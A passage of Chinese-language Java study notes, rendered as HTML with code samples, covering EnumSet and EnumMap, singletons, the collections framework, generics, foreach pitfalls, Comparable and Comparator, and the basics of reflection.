关键字。不过，EnumSet提供了很多有用的<code>静态工厂方法</code></p><ol type="1"><li><p>使用 <code>noneOf()</code> 静态工厂方法创建了一个空的 PlayerType类型的 EnumSet；使用 <code>allOf()</code> 静态工厂方法创建了一个包含所有PlayerType 类型的 EnumSet</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EnumSetTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">PlayerType</span> <span class="token punctuation">&#123;</span>        <span class="token constant">TENNIS</span><span class="token punctuation">,</span>        <span class="token constant">FOOTBALL</span><span class="token punctuation">,</span>        <span class="token constant">BASKETBALL</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">EnumSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">PlayerType</span><span class="token punctuation">></span></span> enumSetNone <span class="token operator">=</span> <span class="token class-name">EnumSet</span><span class="token punctuation">.</span><span class="token function">noneOf</span><span class="token punctuation">(</span><span class="token class-name">PlayerType</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>enumSetNone<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">EnumSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">PlayerType</span><span class="token punctuation">></span></span> enumSetAll <span class="token operator">=</span> <span class="token class-name">EnumSet</span><span class="token punctuation">.</span><span class="token function">allOf</span><span class="token punctuation">(</span><span class="token class-name">PlayerType</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>enumSetAll<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>有了 EnumSet 后，就可以使用 Set 的一些方法了</p></li></ol></li><li><p>还有 <code>EnumMap</code>，是一个专门针对枚举类型的 Map接口的实现类，它可以将枚举常量作为键来使用。EnumMap的<strong>效率</strong>比 HashMap 还要高，可以直接通过数组下标（枚举的ordinal 值）访问到元素。</p></li><li><p>和 EnumSet 不同，EnumMap 不是一个抽象类，所以创建 EnumMap时可以使用 <code>new</code> 关键字</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">EnumMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">PlayerType</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> enumMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EnumMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token class-name">PlayerType</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>在Java中,<code>静态工厂方法</code>(Static FactoryMethod)是一种常用的创建对象的方式。它具有以下特点:</p><ol type="1"><li><p>是静态方法,不需要先创建类的实例,直接通过类名调用。</p></li><li><p>方法名称可以良好表达语义,不一定非要与类名相同。</p></li><li><p>可以返回任意类型的对象,不仅限于当前类对象。</p></li><li><p>可以通过参数调用不同的静态方法返回不同类型或配置的对象。</p></li><li><p>可以在创建对象时进行额外初始化配置工作。</p></li><li><p>静态工厂方法不必每次都返回新的对象实例。</p></li></ol><p>相比直接使用构造器,静态工厂方法更加灵活,可以避免构造器的命名或参数限制,返回更合适的对象,做一些额外初始化工作。</p><p>但也失去了一些构造器的便利性,比如不能被继承等。</p><p>总体来说,静态工厂是获取对象实例很常用的一种设计模式。</p></li><li><p>单例（Singleton）用来保证一个类仅有一个对象，并提供一个访问它的全局访问点，在一个进程中。因为这个类只有一个对象，所以就不能再使用<code>new</code> 关键字来创建新的对象了</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>通常情况下，实现单例并非易事，来看下面这种写法。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Singleton</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">static</span> <span class="token class-name">Singleton</span> singleton<span class="token punctuation">;</span>     <span class="token keyword">private</span> <span class="token class-name">Singleton</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Singleton</span> <span class="token function">getSingleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>singleton <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token class-name">Singleton</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>singleton <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              singleton <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> singleton<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span></code></pre><p>“要用到 <ahref="https://javabetter.cn/thread/volatile.html">volatileopen in newwindow</a>、<ahref="https://javabetter.cn/thread/synchronized-1.html">synchronizedopenin new window</a> 关键字等等，但枚举的出现，让代码量减少到极致。”</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">EasySingleton</span><span class="token punctuation">&#123;</span>    <span class="token constant">INSTANCE</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3 id="集合框架listsetmap队列">集合框架：List、Set、Map、队列</h3><ol type="1"><li><p>集合框架的结构图<imgsrc="https://s2.loli.net/2023/09/08/GRHewptVI7uXZEU.png"alt="gailan-01" /></p></li><li><p>List的特点是存取有序，可以存放重复的元素，可以用下标对元素进行操作</p></li><li><p>ArrayList</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 创建一个集合</span><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 添加元素</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"王二"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"沉默"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"陈清扬"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 遍历集合 for 循环</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> s <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 遍历集合 for each</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> s <span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 删除元素</span>list<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 遍历集合</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> s <span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 修改元素</span>list<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"王二狗"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 遍历集合</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> s <span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><ol type="1"><li>ArrayList是由数组实现的，支持<code>随机存取</code>，也就是可以通过<code>下标</code>直接存取元素</li><li>从尾部插入和删除元素会比较快捷，从中间插入和删除元素会比较低效，因为涉及到数组元素的复制和移动；</li><li>如果内部数组的容量不足时会自动扩容，因此当元素非常庞大的时候，效率会比较低。</li></ol></li><li><p><code>LinkedList</code>是由双向链表实现的，不支持随机存取，只能从一端开始遍历，直到找到需要的元素后返回</p><ol type="1"><li>任意位置插入和删除元素都很方便，因为只需要改变前一个节点和后一个节点的引用即可，不像ArrayList 那样需要复制和移动数组元素；</li><li>List 的实现类还有一个 Vector，Vector 是<code>线程安全的</code>，像get、set、add 这些方法都加了 <code>synchronized</code>关键字，就导致执行执行效率会比较低，所以现在已经很少用了</li></ol></li><li><p><code>泛型</code>：限定符 <code>extends</code>可以缩小泛型的类型范围。</p><ol type="1"><li>Java泛型只在<code>编译</code>时起作用，运行时并不会保留<code>泛型</code>类型信息</li></ol></li><li><p>Java迭代器<code>Iterator</code>和<code>Iterable</code>有什么区别</p><ol type="1"><li><strong>Iterable 接口</strong>：<ul><li><code>Iterable</code> 是一个接口，用于表示对象是可迭代的。任何实现了<code>Iterable</code> 接口的类都可以被用于增强型 for 循环。</li><li><code>Iterable</code> 接口要求实现 <code>iterator()</code>方法，该方法返回一个实现了 <code>Iterator</code> 接口的对象。</li></ul></li></ol><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Iterable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><ol start="2" type="1"><li><strong>Iterator 接口</strong>：<ul><li><code>Iterator</code>是一个接口，用于提供一种遍历集合的方式，允许逐个访问集合中的元素。</li><li><code>Iterator</code> 接口定义了方法如<code>hasNext()</code>、<code>next()</code> 和<code>remove()</code>，用于检查是否还有下一个元素、获取下一个元素以及删除当前元素。</li></ul></li></ol><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">boolean</span> <span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">T</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>总结区别</strong>：</p><ul><li><code>Iterable</code> 接口用于表示一个对象可以被迭代，提供了<code>iterator()</code> 方法。</li><li><code>Iterator</code>接口用于实际的迭代，提供了在集合中移动和访问元素的方法。</li></ul><p>在使用增强型 for 循环时，Java 会自动使用 <code>Iterable</code>接口，而 <code>Iterator</code>接口通常用于手动控制迭代过程。例如，可以通过调用 <code>iterator()</code>方法获取一个 <code>Iterator</code> 对象，然后使用 <code>hasNext()</code>和 <code>next()</code> 方法来遍历集合。</p></li><li><p>Set的特点是存取无序，不可以存放重复的元素，不可以用下标对元素进行操作</p></li><li><p>如果我们需要按照顺序存储一组元素，那么<code>ArrayList</code>和<code>LinkedList</code>可能更适合；如果我们需要存储键值对并根据键进行查找，那么<code>HashMap</code>可能更适合。</p></li><li><p>HashSet仍然是<strong>最好的选择</strong>。例如，当我们需要快速查找一个元素是否存在于某个集合中，并且我们不需要对元素进行排序时，HashSet可以提供高效的性能</p></li><li><p>LinkedHashSet 虽然继承自 HashSet，其实是由<code>LinkedHashMap</code> 实现的。</p></li><li><p>TreeSet 是由 <code>TreeMap（</code>后面会讲）实现的，只不过同样操作的键位，值由一个固定的 Object 对象填充。</p></li><li><p>TreeSet 是一种基于<code>红黑树</code>实现的有序集合，它实现了<code>SortedSet</code>接口，可以自动对集合中的元素进行排序。按照键的自然顺序或指定的比较器顺序进行排序。</p></li><li><p>TreeSet 不允许插入 <code>null</code> 元素，否则会抛出NullPointerException 异常</p></li><li><p><code>ArrayDeque</code>是一个基于数组实现的双端队列，为了满足可以同时在数组两端插入或删除元素的需求，数组必须是循环的，也就是说数组的任何一点都可以被看作是起点或者终点</p></li><li><p><code>LinkedList</code> 一般应该归在 List 下，只不过，它也实现了Deque 接口，可以作为队列来使用。等于说，LinkedList 同时实现了Stack、Queue、PriorityQueue 的所有功能。</p><ul><li><code>底层实现</code>方式不同：LinkedList 是基于链表实现的，而ArrayDeque 是基于数组实现的。</li><li><code>随机访问</code>的效率不同：由于底层实现方式的不同，LinkedList对于随机访问的效率较低，时间复杂度为 O(n)，而 ArrayDeque可以通过下标随机访问元素，时间复杂度为 O(1)。</li><li><code>迭代器</code>的效率不同：LinkedList对于迭代器的效率比较低，因为需要通过链表进行遍历，时间复杂度为 O(n)，而ArrayDeque的迭代器效率比较高，因为可以直接访问数组中的元素，时间复杂度为O(1)。</li><li><code>内存占用</code>不同：由于 LinkedList是基于链表实现的，它在存储元素时需要额外的空间来存储链表节点，因此内存占用相对较高，而ArrayDeque 是基于数组实现的，内存占用相对较低</li></ul></li><li><p>在使用 LinkedList 作为队列时，可以使用 <code>offer()</code>方法将元素添加到队列的末尾，使用 <code>poll()</code>方法从队列的头部删除元素</p></li><li><p><code>PriorityQueue</code>是一种优先级队列，它的出队顺序与元素的优先级有关，要想有<code>优先级</code>，元素就需要实现Comparable 接口或者 Comparator 接口</p></li><li><p><code>HashMap</code> 实现了 Map接口，可以根据键快速地查找对应的值——通过哈希函数将键映射到哈希表中的一个索引位置，从而实现快速访问</p><ul><li>HashMap 中的键和值都可以为 null。如果键为null，则将该键映射到哈希表的第一个位置。</li><li>可以使用迭代器或者 forEach 方法遍历 HashMap 中的键值对。</li><li>HashMap有一个初始容量和一个负载因子。初始容量是指哈希表的初始大小，负载因子是指哈希表在扩容之前可以存储的键值对数量与哈希表大小的比率。默认的初始容量是16，负载因子是 0.75</li></ul></li><li><p>HashMap已经非常强大了，但它是无序的。如果我们需要一个<strong>有序</strong>的Map，就要用到LinkedHashMap。LinkedHashMap 是 HashMap的<strong>子类</strong>，它使用链表来记录插入/访问元素的顺序。</p><p>LinkedHashMap 可以看作是 <code>HashMap + LinkedList</code>的合体，它使用了哈希表来存储数据，又用了双向链表来维持顺序。</p></li><li><p>TreeMap 实现了 <code>SortedMap</code>接口，可以自动将键按照<strong>自然顺序</strong>或指定的<code>比较器</code>顺序排序，并保证其元素的顺序。内部使用<code>红黑树</code>来实现键的排序和查找。</p></li></ol><h3 id="java范型">Java范型</h3><ol type="1"><li><p>泛型方法的定义<imgsrc="https://s2.loli.net/2023/09/16/ZsRn9Y4cu1kKfXd.png"alt="generic-01" /></p></li><li><p>限定符 <code>extends</code> 可以缩小泛型的类型范围</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Arraylist</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span> <span class="token keyword">extends</span> <span class="token class-name">Wanger</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>虚拟机</code>是没有泛型的</p></li><li><p>通配符使用英文的问号<code>（?）</code>来表示。在我们创建一个泛型对象时，可以使用关键字<code>extends</code> 限定子类，也可以使用关键字 <code>super</code>限定父类</p></li><li><p>Java虚拟机会将泛型的类型变量<code>擦除</code>，并替换为限定类型（没有限定的话，就用<code>Object</code>）</p></li><li><p>通配符用于表示某种未知的类型，例如 <code>List&lt;?&gt;</code>表示一个可以存储任何类型对象的List，但是不能对其中的元素进行<code>添加</code>操作。</p></li></ol><h3 id="java-foreach陷阱">Java foreach陷阱</h3><ol type="1"><li>fail-fast是一种通用的系统设计思想，一旦检测到可能会发生错误，就立马抛出异常</li><li>在阿里巴巴的 Java 开发手册里也提到了，不要在 for-each循环里进行元素的 <code>remove/add</code> 操作。remove 元素请使用Iterator 方式。</li><li>正确操作：<strong>remove 后 break</strong>Java反射</li></ol><h3 id="java-hashmap">Java HashMap</h3><ol type="1"><li>HashMap的实现原理是基于<code>哈希表</code>的，它的<code>底层</code>是一个数组，数组的每个位置可能是一个<code>链表</code>或<code>红黑树</code>，也可能只是一个键值对（后面会讲）。当添加一个键值对时，HashMap会根据键的哈希值计算出该键对应的数组下标（索引），然后将键值对插入到对应的位置。</li></ol><h3 id="java-linkedhashmap">Java LinkedHashMap</h3><ol type="1"><li>HashMap也不例外，有一种需求它就满足不了，假如我们需要一个按照<strong>插入顺序</strong>来排列的键值对集合，那HashMap 就无能为力了</li><li>LinkedHashMap 就是为这个需求应运而生的。LinkedHashMap<code>继承</code>了 HashMap，所以 HashMap有的关于键值对的功能，它也有了</li><li>在此基础上，LinkedHashMap内部追加了<code>双向链表</code>，来维护元素的插入顺序。注意下面代码中的<code>before</code> 和<code>after</code>，它俩就是用来维护当前元素的前一个元素和后一个元素的顺序的</li><li>LinkedHashMap不仅能够维持插入顺序，还能够维持<code>访问顺序</code></li><li>使用 LinkedHashMap 来实现 LRU 缓存</li><li>它的<code>头节点</code>表示最早插入或访问的元素，<code>尾节点</code>表示最晚插入或访问的元素</li></ol><h3 id="java-treemap">Java TreeMap</h3><ol type="1"><li>TreeMap由<code>红黑树</code>实现，可以保持元素的<code>自然顺序</code>，或者实现了<code>Comparator</code> 接口的自定义顺序<ol type="1"><li>红黑树（英语：Red–black tree）是一种自平衡的二叉查找树（BinarySearch Tree）</li><li><code>AVL树</code>是一种高度平衡的二叉查找树，它要求左子树和右子树的<code>高度差</code>不超过1。由于AVL树的平衡度比较高，因此在进行插入和删除操作时需要进行更多的旋转操作来保持平衡，但是在<code>查找操</code>作时效率较高。AVL树适用于读操作比较多的场景</li></ol></li><li>TreeMap的元素是经过排序的，那找出最大的那个，最小的那个，或者找出所有大于或者小于某个值的键来说，就方便多了。</li><li>选择map<ol type="1"><li>按照<code>键排序</code>，则可以使用TreeMap;如果不需要排序，则可以使用 HashMap 或 LinkedHashMap</li><li>是否需要高效的查找。如果需要高效的查找，则可以使用 LinkedHashMap 或HashMap，因为它们的查找操作的时间复杂度为 O(1)，而是 TreeMap 是 O(logn)</li></ol></li></ol><h3 id="双端队列-arraydeque">双端队列 ArrayDeque</h3><ol type="1"><li><p>当需要使用栈时，Java已不推荐使用<em>Stack</em>，而是推荐使用更高效的<em>ArrayDeque</em>（双端队列），第一次讲<code>集合框架</code>的时候，Stack是一个“原始”类，它的核心方法上都加了 <code>synchronized</code>关键字以确保线程安全，当我们不需要线程安全（比如说单线程环境下）性能就会比较差。</p></li><li><p><code>ArrayDeque</code> 又实现了 <code>Deque</code>接口（<code>Deque</code> 又实现了 <code>Queue</code> 接口）</p></li><li><p>要讲栈和队列，首先要讲<em>Deque</em>接口。<em>Deque</em>的含义是“doubleendedqueue”，即双端队列，它既可以当作<code>栈</code>使用，也可以当作队列使用</p><p>下表列出了<em>Deque</em>与<em>Stack</em>对应的接口：</p><table><colgroup><col style="width: 16%" /><col style="width: 31%" /><col style="width: 52%" /></colgroup><thead><tr class="header"><th>Stack Method</th><th>Equivalent Deque Method</th><th>说明</th></tr></thead><tbody><tr class="odd"><td>push(e)</td><td>addFirst(e)</td><td>向栈顶插入元素，失败则抛出异常</td></tr><tr class="even"><td>无</td><td>offerFirst(e)</td><td>向栈顶插入元素，失败则返回<code>false</code></td></tr><tr class="odd"><td>pop()</td><td>removeFirst()</td><td>获取并删除栈顶元素，失败则抛出异常</td></tr><tr class="even"><td>无</td><td>pollFirst()</td><td>获取并删除栈顶元素，失败则返回<code>null</code></td></tr><tr class="odd"><td>peek()</td><td>getFirst()</td><td>获取但不删除栈顶元素，失败则抛出异常</td></tr><tr class="even"><td>无</td><td>peekFirst()</td><td>获取但不删除栈顶元素，失败则返回<code>null</code></td></tr></tbody></table></li><li><p><em>ArrayDeque</em>是<code>非线程安全</code>的（notthread-safe）</p></li><li><p>ArrayDeque 是 Java标准库中的一种双端队列实现，底层基于<code>数组</code>实现。<strong>与LinkedList 相比</strong>，ArrayDeque的性能更优，因为它使用连续的内存空间存储元素，可以更好地利用 CPU缓存，在大多数情况下也更快。</p><p>因为ArrayDeque 的底层实现是<code>数组</code>，而 LinkedList的底层实现是<code>链表</code>。数组是一段连续的内存空间，而链表是由多个节点组成的，每个节点存储数据和指向下一个节点的指针。因此，在使用LinkedList 时，需要频繁进行内存分配和释放，而 ArrayDeque在创建时就一次性分配了连续的内存空间，不需要频繁进行内存分配和释放，这样可以更好地利用CPU 缓存，提高访问效率。</p></li></ol><h3 id="java-优先级队列priorityqueue">Java 优先级队列PriorityQueue</h3><ol type="1"><li><p>PriorityQueue就是一个队列，但是它不是先进先出的，而是按照<code>元素优先级</code>进行排序的。当你往PriorityQueue中插入一个元素时，它会自动根据元素的优先级将其插入到合适的位置。当你从PriorityQueue 中删除一个元素时，它会自动将优先级最高的元素出队</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 创建 PriorityQueue 对象，并指定优先级顺序</span><span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token class-name">Comparator</span><span class="token punctuation">.</span><span class="token function">reverseOrder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 添加元素到 PriorityQueue</span>priorityQueue<span class="token punctuation">.</span><span class="token function">offer</span><span class="token punctuation">(</span><span class="token string">"沉默王二"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>priorityQueue<span class="token punctuation">.</span><span class="token function">offer</span><span class="token punctuation">(</span><span class="token string">"陈清扬"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>priorityQueue<span class="token punctuation">.</span><span class="token function">offer</span><span class="token punctuation">(</span><span class="token string">"小转铃"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 打印 PriorityQueue 中的元素</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"PriorityQueue 中的元素："</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>priorityQueue<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3 id="comparable-和-comparator">Comparable 和 Comparator</h3><ol type="1"><li><p>一个类实现了 Comparable接口，意味着该类的对象可以直接进行比较（排序），但比较（排序）的方式只有一种，很<strong>单一</strong>。</p><p>一个类如果想要保持原样，又需要进行<strong>不同方式</strong>的比较（排序），就可以定制比较器（实现Comparator 接口）。</p><p>Comparable 接口在 <code>java.lang</code> 包下，而<code>Comparator</code> 接口在 <code>java.util</code>包下，算不上是亲兄弟，但可以称得上是表（堂）兄弟。</p></li><li></li></ol><h3 id="java反射">Java反射</h3><ol type="1"><li><p>缺陷</p><ol type="1"><li><strong>破坏封装</strong>：由于反射允许访问私有字段和私有方法，所以可能会破坏封装而导致安全问题。</li><li><strong>性能开销</strong>：由于反射涉及到动态解析，因此无法执行 Java虚拟机优化，再加上反射的写法的确要复</li></ol></li><li><p>反射的主要应用场景有：</p><ul><li><strong>开发通用框架</strong>：像Spring，为了保持通用性，通过配置文件来加载不同的对象，调用不同的方法。</li><li><strong>动态代理</strong>：在面向切面编程中，需要拦截特定的方法，就会选择动态代理的方式，而动态代理的底层技术就是反射。</li><li><strong>注解</strong>：注解本身只是起到一个标记符的作用，它需要利用发射机制，根据标记符去执行特定的行为。</li></ul></li><li><p>example</p><ol type="1"><li>获取反射类的 Class 对象：</li></ol><pre class="language-none"><code class="language-none">Class clazz &#x3D; Class.forName(&quot;com.itwanger.s39.Writer&quot;);</code></pre><p>Java 中的每个类型（包括类、接口、数组以及基础类型）在 JVM中都有一个<code>唯一的 Class 对象</code>与之对应。这个 Class对象被创建的时机是在 JVM 加载类时，由 JVM 自动完成。</p><p>Class对象中包含了与类相关的很多信息，如类的名称、类的父类、类实现的接口、类的构造方法、类的方法、类的字段等等。这些信息通常被称为<code>元数据（metadata）</code></p><ol start="2" type="1"><li><p>通过 Class 对象获取构造方法 Constructor 对象：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>第三步，通过 Constructor 对象初始化反射类对象：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Object</span> object <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>第四步，获取要调用的方法的 Method 对象：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Method</span> setNameMethod <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"setName"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Method</span> getNameMethod <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>第五步，通过 <code>invoke()</code> 方法执行：</p><pre class="language-java" data-language="java"><code class="language-java">setNameMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> <span class="token string">"沉默王二"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>getNameMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span></code></pre></li></ol></li><li><p>要想使用反射，首先需要获得反射类的 Class对象，每一个类，<em>不管它最终生成了多少个对象，这些对象只会对应一个Class 对象</em>，这个 Class 对象是由 